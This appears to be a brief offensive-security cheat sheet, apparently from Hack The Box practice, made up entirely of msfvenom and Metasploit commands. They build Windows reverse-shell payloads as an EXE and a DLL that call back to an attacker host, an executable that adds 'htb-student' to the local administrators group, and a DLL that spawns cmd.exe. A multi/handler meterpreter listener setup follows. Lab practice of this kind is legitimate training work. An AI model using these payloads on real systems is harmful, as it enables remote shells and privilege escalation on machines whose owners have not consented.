
Exe : 
```sh
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.15.201 LPORT=4242 -f exe > shell.exe
```

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators htb-student /add" -f exe > SecurityService.exe
```

dll : 
```sh
msfvenom -f dll -p windows/exec CMD="C:\windows\system32\cmd.exe" -o srrstr.dll
```

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.167 LPORT=4242 -f dll > shell.dll
```

Metasploit : 

```sh
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```